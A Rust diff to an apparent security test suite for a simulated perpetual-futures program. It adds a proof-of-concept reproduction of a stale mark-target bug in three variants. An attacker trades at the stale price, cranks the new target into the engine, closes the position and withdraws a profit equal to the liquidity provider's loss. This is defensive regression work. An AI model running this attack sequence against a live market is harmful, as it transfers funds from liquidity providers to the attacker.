@@ -79,10 +79,11 @@ pub enum KnownBlocker {
     TerminalDustPayoutErasure,
     CrossMarginInsuranceDrain,
     CompositeOracleTimeSkew,
+    UnstagedMarkTarget,
 }
 
 impl KnownBlocker {
-    pub const COUNT: usize = 23;
+    pub const COUNT: usize = 24;
 
     pub const fn index(self) -> usize {
         match self {
@@ -109,6 +110,7 @@ impl KnownBlocker {
             Self::TerminalDustPayoutErasure => 20,
             Self::CrossMarginInsuranceDrain => 21,
             Self::CompositeOracleTimeSkew => 22,
+            Self::UnstagedMarkTarget => 23,
         }
     }
 }
@@ -184,6 +186,13 @@ pub struct CpiBackingFeeReproduction {
 pub enum CompositeRoundingCase {
     Pr329LargeMove,
     Pr381MicroMove,
+}
+
+#[derive(Clone, Copy, Debug, Serialize, Deserialize, PartialEq, Eq)]
+pub enum TargetStagingCase {
+    AuthMarkPush,
+    EwmaSingleTrade,
+    EwmaBatchTrade,
 }
 
 #[derive(Clone, Copy, Debug, Serialize, Deserialize, PartialEq, Eq)]
@@ -398,6 +407,19 @@ pub struct CompositeOracleTimeSkewReproduction {
     pub cranker_reward: u128,
     pub extracted_tokens: u64,
     pub max_crank_cu: u64,
+}
+
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+pub struct TargetStagingReproduction {
+    pub blocker: KnownBlocker,
+    pub case: TargetStagingCase,
+    pub wrapper_target: u64,
+    pub stale_engine_target: u64,
+    pub moved_engine_mark: u64,
+    pub attacker_profit: u128,
+    pub victim_capital_loss: u128,
+    pub attacker_withdrawn: u64,
+    pub attack_cu: u64,
 }
 
 impl SubstitutionKind {
@@ -3369,6 +3391,236 @@ pub fn reproduce_composite_oracle_time_skew(
     })
 }
 
+pub fn reproduce_unstaged_mark_target(
+    mut seed: [u8; 32],
+    case: TargetStagingCase,
+) -> Result<TargetStagingReproduction, String> {
+    seed[0] ^= match case {
+        TargetStagingCase::AuthMarkPush => 0x32,
+        TargetStagingCase::EwmaSingleTrade => 0x33,
+        TargetStagingCase::EwmaBatchTrade => 0xb3,
+    };
+    const OLD_MARK: u64 = 100;
+    const AUTH_TARGET: u64 = 200;
+    const EWMA_TARGET: u64 = 150;
+    const ATTACK_SIZE_Q: i128 = 10_000 * POS_SCALE as i128;
+    const EXISTING_SIZE_Q: i128 = POS_SCALE as i128;
+
+    let (mut env, attacker, lp, attack_size_q, wrapper_target, engine_epoch_before) = match case {
+        TargetStagingCase::AuthMarkPush => {
+            let mut env = V16Svm::new(
+                seed,
+                MarketConfig {
+                    initial_price: OLD_MARK,
+                    max_price_move_bps_per_slot: 10_000,
+                    max_accrual_dt_slots: 1,
+                    actor_deposits: [
+                        1_000_100,
+                        4_000_000,
+                        super::v16_svm::USER_DEPOSIT,
+                        super::v16_svm::USER_DEPOSIT,
+                        super::v16_svm::EXIT_MAKER_DEPOSIT,
+                    ],
+                    ..MarketConfig::default()
+                },
+            );
+            env.configure_auth_mark(false, 0, 0, OLD_MARK)
+                .map_err(|error| format!("PR 332 configure AuthMark: {error}"))?;
+            env.trade_cpi(0, 1, 0, EXISTING_SIZE_Q, 0, 0)
+                .map_err(|error| format!("PR 332 open liveness-control position: {error}"))?;
+            let epoch_before = env.primary_market_state().1.oracle_epoch;
+            env.warp_to_slot(2);
+            env.push_auth_mark(0, 1, AUTH_TARGET)
+                .map_err(|error| format!("PR 332 push honest AuthMark: {error}"))?;
+            (
+                env,
+                0usize,
+                1usize,
+                ATTACK_SIZE_Q
+                    .checked_add(EXISTING_SIZE_Q)
+                    .ok_or("PR 332 total attack size overflow")?,
+                AUTH_TARGET,
+                epoch_before,
+            )
+        }
+        TargetStagingCase::EwmaSingleTrade | TargetStagingCase::EwmaBatchTrade => {
+            let mut env = V16Svm::new(
+                seed,
+                MarketConfig {
+                    initial_price: OLD_MARK,
+                    max_price_move_bps_per_slot: 10_000,
+                    max_accrual_dt_slots: 1,
+                    actor_deposits: [
+                        1_000,
+                        1_000,
+                        1_000_000,
+                        4_000_000,
+                        super::v16_svm::EXIT_MAKER_DEPOSIT,
+                    ],
+                    ..MarketConfig::default()
+                },
+            );
+            env.configure_ewma_mark(0, 0, OLD_MARK, 1, 0)
+                .map_err(|error| format!("PR 333 configure EWMA mark: {error}"))?;
+            env.warp_to_slot(2);
+            let epoch_before = env.primary_market_state().1.oracle_epoch;
+            let route = match case {
+                TargetStagingCase::EwmaSingleTrade => TradeRoute::NoCpi,
+                TargetStagingCase::EwmaBatchTrade => TradeRoute::BatchNoCpi,
+                TargetStagingCase::AuthMarkPush => unreachable!(),
+            };
+            execute_trade_route(&mut env, route, 0, 1, 0, EXISTING_SIZE_Q, 200, 0)
+                .map_err(|error| format!("PR 333 publish trade-driven EWMA target: {error}"))?;
+            let discovery_profile = env.primary_profile(0);
+            if discovery_profile.mark_ewma_e6 != EWMA_TARGET {
+                return Err(format!(
+                    "PR 333 discovery trade did not move EWMA: mark={}, target={}, insurance={}",
+                    discovery_profile.mark_ewma_e6,
+                    discovery_profile.oracle_target_price_e6,
+                    env.primary_market_state().1.insurance
+                ));
+            }
+            execute_trade_route(&mut env, route, 0, 1, 0, -EXISTING_SIZE_Q, OLD_MARK, 0)
+                .map_err(|error| format!("PR 333 flatten discovery portfolios: {error}"))?;
+            if portfolio_has_active_asset(&env.primary_portfolio(0), 0)
+                || portfolio_has_active_asset(&env.primary_portfolio(1), 0)
+            {
+                return Err("PR 333 discovery positions did not flatten".into());
+            }
+            (
+                env,
+                2usize,
+                3usize,
+                ATTACK_SIZE_Q,
+                EWMA_TARGET,
+                epoch_before,
+            )
+        }
+    };
+
+    let supply_before = env.token_supply_observed();
+    let profile = env.primary_profile(0);
+    let (_, staged_group) = env.primary_market_state();
+    let stale_engine_target = staged_group.assets[0].raw_oracle_target_price;
+    let expected_profile_target = match case {
+        TargetStagingCase::AuthMarkPush => wrapper_target,
+        TargetStagingCase::EwmaSingleTrade | TargetStagingCase::EwmaBatchTrade => OLD_MARK,
+    };
+    if profile.mark_ewma_e6 != wrapper_target
+        || profile.oracle_target_price_e6 != expected_profile_target
+        || staged_group.assets[0].effective_price != OLD_MARK
+        || stale_engine_target != OLD_MARK
+        || staged_group.oracle_epoch != engine_epoch_before
+    {
+        return Err(format!(
+            "{case:?} no longer exposes an unstaged target: profile={}/{}, raw={}, effective={}, \
+             epoch={}/{}",
+            profile.mark_ewma_e6,
+            profile.oracle_target_price_e6,
+            stale_engine_target,
+            staged_group.assets[0].effective_price,
+            staged_group.oracle_epoch,
+            engine_epoch_before
+        ));
+    }
+
+    let attacker_capital_before = env.primary_portfolio(attacker).capital.get();
+    let victim_capital_before = env.primary_portfolio(lp).capital.get();
+    let stale_increase = env
+        .trade_cpi(attacker, lp, 0, ATTACK_SIZE_Q, 0, 0)
+        .map_err(|error| format!("{case:?} stale-price CPI risk increase rejected: {error}"))?;
+    if stale_increase.compute_units >= TX_CU_LIMIT {
+        return Err(format!(
+            "{case:?} stale-price risk increase consumed {} CU",
+            stale_increase.compute_units
+        ));
+    }
+
+    env.warp_to_slot(3);
+    let mut moved_engine_mark = OLD_MARK;
+    let mut crank_errors = Vec::new();
+    for _ in 0..8 {
+        for actor in [attacker, lp] {
+            if let Err(error) = env.crank(
+                actor,
+                3,
+                vec![CrankObservationHint {
+                    asset_index: 0,
+                    oracle_accounts: 0,
+                }],
+            ) {
+                crank_errors.push(format!("actor {actor}: {error}"));
+            }
+        }
+        moved_engine_mark = env.primary_market_state().1.assets[0].effective_price;
+        if moved_engine_mark == wrapper_target {
+            break;
+        }
+    }
+    if moved_engine_mark != wrapper_target {
+        return Err(format!(
+            "{case:?} public crank did not commit stale target: \
+             {moved_engine_mark}/{wrapper_target}; {}",
+            crank_errors.join(" | ")
+        ));
+    }
+
+    env.trade_cpi(attacker, lp, 0, -attack_size_q, 0, 0)
+        .map_err(|error| format!("{case:?} close stale-price exposure: {error}"))?;
+    let attacker_flat = env.primary_portfolio(attacker);
+    let victim_flat = env.primary_portfolio(lp);
+    if portfolio_has_active_asset(&attacker_flat, 0) || portfolio_has_active_asset(&victim_flat, 0)
+    {
+        return Err(format!("{case:?} stale-price positions did not flatten"));
+    }
+    let attacker_profit = u128::try_from(attacker_flat.pnl.get())
+        .map_err(|_| format!("{case:?} attacker did not realize positive PnL"))?;
+    let victim_capital_loss = victim_capital_before
+        .checked_sub(victim_flat.capital.get())
+        .ok_or_else(|| format!("{case:?} LP capital increased"))?;
+    let expected_profit = u128::from(wrapper_target - OLD_MARK)
+        .checked_mul(attack_size_q.unsigned_abs())
+        .and_then(|value| value.checked_div(POS_SCALE))
+        .ok_or_else(|| format!("{case:?} expected profit overflow"))?;
+    if attacker_profit != expected_profit || victim_capital_loss != expected_profit {
+        return Err(format!(
+            "{case:?} stale-window value transfer mismatch: attacker={attacker_profit}, \
+             victim={victim_capital_loss}, expected={expected_profit}"
+        ));
+    }
+
+    env.convert_released_pnl(attacker, attacker_profit)
+        .map_err(|error| format!("{case:?} convert stale-window PnL: {error}"))?;
+    let attacker_capital_after = env.primary_portfolio(attacker).capital.get();
+    env.withdraw_primary(attacker, attacker_capital_after)
+        .map_err(|error| format!("{case:?} withdraw stale-window proceeds: {error}"))?;
+    let attacker_withdrawn = env.token_amount(env.actors[attacker].destination_token);
+    let expected_withdrawal = attacker_capital_before
+        .checked_add(attacker_profit)
+        .ok_or_else(|| format!("{case:?} expected withdrawal overflow"))?;
+    if u128::from(attacker_withdrawn) != expected_withdrawal
+        || env.token_supply_observed() != supply_before
+    {
+        return Err(format!(
+            "{case:?} stale-window profit was not publicly extractable: withdrew \
+             {attacker_withdrawn}/{expected_withdrawal}, supply={}/{}",
+            env.token_supply_observed(),
+            supply_before
+        ));
+    }
+    Ok(TargetStagingReproduction {
+        blocker: KnownBlocker::UnstagedMarkTarget,
+        case,
+        wrapper_target,
+        stale_engine_target,
+        moved_engine_mark,
+        attacker_profit,
+        victim_capital_loss,
+        attacker_withdrawn,
+        attack_cu: stale_increase.compute_units,
+    })
+}
+
 pub fn reproduce_rounded_funding_omission(
     mut seed: [u8; 32],
 ) -> Result<RoundedFundingOmissionReproduction, String> {
@@ -6201,6 +6453,18 @@ pub fn composite_rounding_strategy() -> impl Strategy<Value = ([u8; 32], Composi
 #[allow(dead_code)]
 pub fn composite_time_skew_seed_strategy() -> impl Strategy<Value = [u8; 32]> {
     any::<[u8; 32]>()
+}
+
+#[allow(dead_code)]
+pub fn target_staging_strategy() -> impl Strategy<Value = ([u8; 32], TargetStagingCase)> {
+    (
+        any::<[u8; 32]>(),
+        prop::sample::select(vec![
+            TargetStagingCase::AuthMarkPush,
+            TargetStagingCase::EwmaSingleTrade,
+            TargetStagingCase::EwmaBatchTrade,
+        ]),
+    )
 }
 
 #[allow(dead_code)]
